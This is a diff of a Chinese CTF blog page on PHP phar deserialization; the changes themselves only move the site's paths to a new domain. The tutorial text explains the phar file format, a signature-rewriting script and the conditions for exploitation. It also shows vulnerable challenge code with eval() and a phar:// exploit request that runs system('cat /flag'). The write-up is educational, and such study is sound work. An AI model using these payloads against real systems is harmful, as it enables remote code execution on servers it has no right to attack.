@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/ArmageddoxA.github.io/img/fluid.png">
-  <link rel="icon" href="/ArmageddoxA.github.io/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,17 +19,17 @@
     <meta name="description" content="本文讲述web安全里面的phar问题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WEB-PHAR">
-<meta property="og:url" content="https://jackssxx.github.io/ArmageddoxA.github.io/2024/06/10/ctfweb%E4%B9%8Bphar/index.html">
+<meta property="og:url" content="http://armageddoxa.top/2024/06/10/ctfweb%E4%B9%8Bphar/index.html">
 <meta property="og:site_name" content="ArmageddoxA">
 <meta property="og:description" content="本文讲述web安全里面的phar问题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jackssxx.github.io/ArmageddoxA.github.io/img/6.jpg">
+<meta property="og:image" content="http://armageddoxa.top/img/6.jpg">
 <meta property="article:published_time" content="2024-06-10T10:40:04.000Z">
 <meta property="article:modified_time" content="2024-06-10T13:36:46.581Z">
 <meta property="article:author" content="ArmageddoxA">
 <meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://jackssxx.github.io/ArmageddoxA.github.io/img/6.jpg">
+<meta name="twitter:image" content="http://armageddoxa.top/img/6.jpg">
   
   
   
@@ -57,12 +57,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/ArmageddoxA.github.io/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/ArmageddoxA.github.io/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/ArmageddoxA.github.io/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
@@ -71,15 +71,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"jackssxx.github.io","root":"/ArmageddoxA.github.io/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/ArmageddoxA.github.io/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"armageddoxa.top","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/ArmageddoxA.github.io/js/utils.js" ></script>
-  <script  src="/ArmageddoxA.github.io/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
 
@@ -96,7 +96,7 @@
 <div class="header-inner" style="height: 100vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/ArmageddoxA.github.io/">
+    <a class="navbar-brand" href="/">
       <strong>ArmageddxoA</strong>
     </a>
 
@@ -115,7 +115,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ArmageddoxA.github.io/" target="_self">
+              <a class="nav-link" href="/" target="_self">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -127,7 +127,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ArmageddoxA.github.io/archives/" target="_self">
+              <a class="nav-link" href="/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -139,7 +139,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ArmageddoxA.github.io/categories/" target="_self">
+              <a class="nav-link" href="/categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -151,7 +151,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ArmageddoxA.github.io/tags/" target="_self">
+              <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -163,7 +163,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ArmageddoxA.github.io/about/" target="_self">
+              <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
                 <span>ME</span>
               </a>
@@ -193,7 +193,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/ArmageddoxA.github.io/img/6.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('/img/6.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
       <div class="banner-text text-center fade-in-up">
@@ -287,10 +287,10 @@
 
 <p>前面的内容是不限制的，但在该PHP语句中，必须有<code>__HALT_COMPILER()</code>，没有这个，PHP就无法识别出它是Phar文件。</p>
 <h5 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a><strong>manifest</strong></h5><p>用于存放文件的属性、权限等信息。<br>这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的<code>Meta-data</code></p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa9422d6c776c579202bace162dd45720?method=download&shareKey=3f8e182be5fa3849d0ee3c70d6bbe0f5" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa9422d6c776c579202bace162dd45720?method=download&shareKey=3f8e182be5fa3849d0ee3c70d6bbe0f5" srcset="/img/loading.gif" lazyload></p>
 <h5 id="contents"><a href="#contents" class="headerlink" title="contents"></a><strong>contents</strong></h5><p>用于存放Phar文件的内容</p>
 <h5 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h5><p>签名(可选参数)，位于文件末尾，具体格式如下</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1ee2e86f9a0a5e0f0fbd95e2eb5ea3b1?method=download&shareKey=8417416169f6cad143b41416bdeb9dc0" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1ee2e86f9a0a5e0f0fbd95e2eb5ea3b1?method=download&shareKey=8417416169f6cad143b41416bdeb9dc0" srcset="/img/loading.gif" lazyload></p>
 <p>签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密</p>
 <p>当我们修改文件的内容时，签名就会变得无效，这个时候需要<strong>更换一个新的签名</strong><br>更换签名的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read() <br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure>
@@ -300,9 +300,9 @@
 <h4 id="3-创建与解读"><a href="#3-创建与解读" class="headerlink" title="3.创建与解读"></a><strong>3.创建与解读</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//我们由以下代码可以创建一个phar文件（大部分这样的）</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; data=<span class="hljs-string">&#x27;hu3sky&#x27;</span>;  <span class="hljs-comment">//动态添加属性</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>然后点击运行，这样你所在的目录就会出现一个phar的phar文件</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8713aa5a75a4ceaea32714bcc95efe80?method=download&shareKey=bb0fc768aa591ec984a8bd2baf6940ce" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8713aa5a75a4ceaea32714bcc95efe80?method=download&shareKey=bb0fc768aa591ec984a8bd2baf6940ce" srcset="/img/loading.gif" lazyload></p>
 <p>我们把它拖进010看一下：</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEB0af0f95a4cde6b50aa9f473580d42b36?method=download&shareKey=fc1c42a87126a016aa14685c881efbb5" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB0af0f95a4cde6b50aa9f473580d42b36?method=download&shareKey=fc1c42a87126a016aa14685c881efbb5" srcset="/img/loading.gif" lazyload></p>
 <p>很容易发现里面存储的数据是以序列化格式存储的，那么这里就有一个漏洞利用点</p>
 <h2 id="题眼"><a href="#题眼" class="headerlink" title="题眼"></a><strong>题眼</strong></h2><p>文件上传+读取到的php反序列化</p>
 <h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a><strong>讲解</strong></h2><h3 id="1-成因"><a href="#1-成因" class="headerlink" title="1.成因"></a><strong>1.成因</strong></h3><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p>
@@ -310,14 +310,14 @@
 <h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a><strong>2.利用条件</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、phar文件能够上传至服务器 <br><span class="hljs-comment">//即要求存在file_get_contents()、fopen()这种函数</span><br><br><span class="hljs-number">2</span>、要有可利用的魔术方法<br><span class="hljs-comment">//这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</span><br><br><span class="hljs-number">3</span>、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br><span class="hljs-comment">//一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化</span><br><br><span class="hljs-number">4</span>、php.ini中的phar.<span class="hljs-keyword">readonly</span>选项，需要为Off（默认是on）。  <span class="hljs-comment">//这里指的是配置问题</span><br></code></pre></td></tr></table></figure>
 
 <p>Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>等，具体如下图，也就是下面的函数如果参数可控可以造成Phar反序列化</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdc70ba03be428fdd54880d53d2d4a772?method=download&shareKey=f4c489ac7151a4e553956f7f76bbf7a7" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdc70ba03be428fdd54880d53d2d4a772?method=download&shareKey=f4c489ac7151a4e553956f7f76bbf7a7" srcset="/img/loading.gif" lazyload></p>
 <h2 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a><strong>构造过程</strong></h2><p>明确是phar反序列化–&gt;在本地调试代码（这里分为反序列化链子的构造和phar文件的创建）</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h2><h3 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a><strong>[SWPUCTF 2021 新生赛]babyunser</strong></h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBefd149833595d43e24548b0ee7aa4db1?method=download&shareKey=94761bb8a75fc6818441331fa17c3bb1" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h2><h3 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a><strong>[SWPUCTF 2021 新生赛]babyunser</strong></h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBefd149833595d43e24548b0ee7aa4db1?method=download&shareKey=94761bb8a75fc6818441331fa17c3bb1" srcset="/img/loading.gif" lazyload></p>
 <h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a><strong>解释</strong></h4><p>通过起初的简单上传木马文件和查看得到如下结果：</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8e03ed29a3e9d3a5902ddaa73022d14d?method=download&shareKey=5692ea4e06edbd3a87f89cc67ad2316c" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8e03ed29a3e9d3a5902ddaa73022d14d?method=download&shareKey=5692ea4e06edbd3a87f89cc67ad2316c" srcset="/img/loading.gif" lazyload></p>
 <p>1.上传的php木马文件被解析成txt文件，而并没有警告非合理文件上传</p>
 <p>2.通过上传和查阅</p>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEB42d0ce937f5468cafcdb9af4dcff2354?method=download&shareKey=f0a83b5734e35fcab870bed6fa0ff99a" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB42d0ce937f5468cafcdb9af4dcff2354?method=download&shareKey=f0a83b5734e35fcab870bed6fa0ff99a" srcset="/img/loading.gif" lazyload></p>
 <p>1)传上去的文件并没有发生存储（这里有想到条件竞争，但是并没有警告上传的非法文件）</p>
 <p>2)read.php与upload.php可以读取源码，而且在read.php里面发现至关重要的一点</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br></code></pre></td></tr></table></figure>
@@ -369,7 +369,7 @@
 <p>file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;d3919c7d5f0953dfa110c11f3a108be7.txt&amp;method&#x3D;write&amp;var&#x3D;content&amp;cmd&#x3D;system(‘cat &#x2F;flag’);</p>
 <p>前面那句话就相当于解压phar，后面method和var是源码中需要的传参，这段代码的目的是根据通过POST请求发送的<code>method</code>参数调用相应的类方法，并传递<code>var</code>参数，然后返回类中的<code>content</code>属性的值。</p>
 <h3 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a><strong>[NSSRound#4 SWPU]1zweb</strong></h3><p>（只说预期解）考点phar文件上传+绕过stub限制获取flag</p>
-<h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBe3d80bf5bf2c941ffc748bf799ee2c06?method=download&shareKey=5d9ea465229f627065a4a97416a9b36a" srcset="/ArmageddoxA.github.io/img/loading.gif" lazyload alt="img"></p>
+<h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBe3d80bf5bf2c941ffc748bf799ee2c06?method=download&shareKey=5d9ea465229f627065a4a97416a9b36a" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>与上个题一样查阅源码加上f12里的一部分，这里学了一手整理代码Shift+Alt+F直接格式化整理：</p>
 <p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -409,7 +409,7 @@
     
       <span class="category-chain">
         
-  <a href="/ArmageddoxA.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" class="category-chain-item">信息安全</a>
+  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" class="category-chain-item">信息安全</a>
   
   
 
@@ -424,7 +424,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/ArmageddoxA.github.io/tags/web%E5%AE%89%E5%85%A8/" class="print-no-link">#web安全</a>
+        <a href="/tags/web%E5%AE%89%E5%85%A8/" class="print-no-link">#web安全</a>
       
     </div>
   
@@ -437,7 +437,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>WEB-PHAR</div>
-      <div>https://jackssxx.github.io/ArmageddoxA.github.io/2024/06/10/ctfweb之phar/</div>
+      <div>http://armageddoxa.top/2024/06/10/ctfweb之phar/</div>
     </div>
     <div class="license-meta">
       
@@ -485,7 +485,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/ArmageddoxA.github.io/2024/06/10/hello/" title="HELLO">
+                      <a href="/2024/06/10/hello/" title="HELLO">
                         <span class="hidden-mobile">HELLO</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -624,8 +624,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/ArmageddoxA.github.io/js/events.js" ></script>
-<script  src="/ArmageddoxA.github.io/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -647,7 +647,7 @@
 
 
   
-    <script  src="/ArmageddoxA.github.io/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -746,7 +746,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/ArmageddoxA.github.io/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
@@ -754,7 +754,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/ArmageddoxA.github.io/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
